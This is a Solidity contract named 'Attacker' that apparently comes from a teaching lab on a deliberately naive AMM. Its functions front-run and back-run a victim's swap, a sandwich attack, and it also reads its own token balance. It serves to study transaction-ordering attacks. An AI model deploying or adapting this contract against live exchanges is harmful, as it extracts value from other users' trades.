// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface INaiveAMM {
    function swapETHForToken(uint256 minTokensOut) external payable;
    function swapTokenForETH(uint256 tokenAmountIn, uint256 minEthOut) external;
    function tokenBalance(address user) external view returns (uint256);
}

/**
 * @title Attacker
 * @author Ishan Lakhwani
 * @notice Simulates a front-running bot that detects a large swap and swaps first to get a better price.
 */
contract Attacker {
    INaiveAMM public amm;

    constructor(address _amm) {
        amm = INaiveAMM(_amm);
    }

    /**
     * @notice Front-run by swapping ETH for token before the victim does.
     * @param minTokensOut Attacker's own slippage check (can set to 1 or 0 if you don't care).
     */
    function frontRunBuyTokens(uint256 minTokensOut) external payable {
        amm.swapETHForToken{value: msg.value}(minTokensOut);
    }

    /**
     * @notice Optionally back-run by selling the tokens after the victim pushes up the price.
     */
    function backRunSellTokens(uint256 tokenAmountIn, uint256 minEthOut) external {
        amm.swapTokenForETH(tokenAmountIn, minEthOut);
    }

    /**
     * @notice Check how many tokens the Attacker contract holds in the AMM's internal mapping.
     */
    function getAttackerTokenBalance() external view returns (uint256) {
        return amm.tokenBalance(address(this));
    }

    // Accept ETH
    receive() external payable {}
}
